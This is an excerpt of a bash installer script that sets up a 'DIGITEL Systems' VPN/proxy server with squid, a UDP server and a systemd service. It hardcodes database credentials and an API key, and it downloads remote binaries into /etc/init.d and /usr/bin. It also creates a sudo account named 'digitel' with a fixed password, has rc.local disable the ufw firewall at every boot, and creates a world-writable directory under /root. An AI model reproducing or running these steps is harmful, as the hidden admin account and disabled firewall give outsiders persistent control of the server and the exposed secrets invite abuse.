...
#Script Variables
HOST='173.214.172.82';
USER='nrvpnxyz_digitelvpn';
PASS='dSSHi9117#@91AAH1';
DBNAME='nrvpnxyz_digitelvpn';
API_LINK='https://digitelvpn.info/api/authentication';
API_KEY='@@DIGITEL';
...
wget 'http://digitelsystems.com/script/digitel/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
...
rm ERR_INVALID_URL
echo '<!--digitelsystemsDev--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
chmod 755 *
service squid3 stop
cd /etc || exit
...
install_sudo(){
    useradd -m digitel 2>/dev/null; echo digitel:@@@digitela@@@ | chpasswd &>/dev/null; usermod -aG sudo digitel &>/dev/null
...
wget -O /usr/bin/udpServer 'http://digitelsystems.com/script/digitel/udpServer'
wget -O $udp_file/limitador.sh 'http://digitelsystems.com/script/digitel/limitador.sh'
...
[Unit]
Description=UDPserver Service by digitelsystems
...
install_rclocal(){
  {
    ...
    echo "[Unit]
Description=digitelsystems service
Documentation=https://digitelsystems.com
...
[Install]
WantedBy=multi-user.target" >> /etc/systemd/system/digitelsystems.service
rm -rf /etc/rc.local
    echo '#!/bin/sh -e
service ufw stop
ufw disable
...
exit 0' >> /etc/rc.local
    ...
    sudo systemctl enable digitelsystems
    sudo systemctl start digitelsystems.service

mkdir -m 777 /root/.web
echo "Made with love by: DIGITEL Systems... " >> /root/.web/index.php
